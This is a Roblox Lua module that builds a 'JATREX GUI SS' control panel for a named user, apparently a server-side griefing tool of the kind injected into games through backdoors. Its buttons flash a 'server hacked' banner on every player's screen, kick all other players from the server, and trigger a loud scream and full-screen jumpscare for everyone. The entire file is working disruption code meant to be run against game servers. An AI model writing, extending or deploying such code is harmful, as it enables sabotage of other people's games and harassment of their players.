local module = {}

function module.load(targetName)
    local myUsername = targetName or "red_wanted1" 

    -- (IDs) المعرفات
    local decalID = "73884714863714"
    local screamID = 6754147732
    local stolenMusicID = 1840712882
    local discoActive = false

    local function getImg(id)
        return "rbxassetid://" .. id
    end
    local finalAsset = getImg(decalID)

    local player = game.Players:FindFirstChild(myUsername)
    if player then
        local screen = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        screen.Name = "JatrexPanel"
        screen.ResetOnSpawn = false

        -- تصميم اللوحة
        local main = Instance.new("Frame", screen)
        main.Size = UDim2.new(0, 500, 0, 320) 
        main.Position = UDim2.new(0.2, 0, 0.2, 0)
        main.BackgroundColor3 = Color3.new(0, 0, 0)
        main.BorderColor3 = Color3.new(1, 0.5, 0)
        main.Active = true; main.Draggable = true

        local title = Instance.new("TextLabel", main)
        title.Size = UDim2.new(1, 0, 0, 40)
        title.Text = "JATREX GUI SS"
        title.TextColor3 = Color3.new(1, 0.5, 0)
        title.BackgroundColor3 = Color3.new(0.1, 0, 0)
        title.Font = Enum.Font.Code; title.TextSize = 24

        local function createBtn(name, x, y, func, color)
            local btn = Instance.new("TextButton", main)
            btn.Size = UDim2.new(0.3, 0, 0, 35)
            btn.Position = UDim2.new(x, 0, 0, y)
            btn.Text = name
            btn.BackgroundColor3 = color or Color3.new(0.2, 0.1, 0)
            btn.TextColor3 = Color3.new(1, 1, 1)
            btn.Font = Enum.Font.Code; btn.TextSize = 10
            btn.MouseButton1Click:Connect(func)
            return btn
        end

        -- الزراير (نفس اللي في كودك)
        createBtn("FULLSCREEN HACK", 0.02, 55, function()
            for _, p in pairs(game.Players:GetPlayers()) do
                local g = Instance.new("ScreenGui", p.PlayerGui); g.IgnoreGuiInset = true
                local f = Instance.new("Frame", g); f.Size = UDim2.new(1, 0, 1, 0); f.BackgroundColor3 = Color3.new(0, 0, 0); f.BackgroundTransparency = 0.6
                local t = Instance.new("TextLabel", f); t.Size = UDim2.new(1, 0, 0.2, 0); t.Position = UDim2.new(0, 0, 0.4, 0)
                t.Text = "SERVER HAS GOT HACKED BY JATREX TEAM"; t.TextColor3 = Color3.new(1, 0.5, 0); t.TextScaled = true; t.BackgroundTransparency = 1; t.Font = Enum.Font.Code
                task.delay(8, function() g:Destroy() end)
            end
        end)

        createBtn("KICK ALL", 0.35, 55, function()
            for _, p in pairs(game.Players:GetPlayers()) do
                if p ~= player then p:Kick("SERVER DESTROYED BY JATREX TEAM") end
            end
        end, Color3.new(0.6, 0, 0))

        createBtn("JUMPSCARE", 0.35, 105, function()
            for _, p in pairs(game.Players:GetPlayers()) do
                if p.Character then
                    local s = Instance.new("Sound", p.Character:FindFirstChild("HumanoidRootPart") or p.Character:FindFirstChild("Head")); s.SoundId = "rbxassetid://" .. screamID; s.Volume = 10; s:Play()
                    local sg = Instance.new("ScreenGui", p.PlayerGui); local img = Instance.new("ImageLabel", sg); img.Size = UDim2.new(1,0,1,0); img.Image = finalAsset; img.BackgroundTransparency = 1
                    task.delay(2, function() sg:Destroy() end)
                end
            end
        end)

        createBtn("EXIT GUI", 0.68, 205, function() screen:Destroy() end)

        -- [باقي الزراير تقدر تضيفها هنا بنفس الطريقة]
    end
end

return module
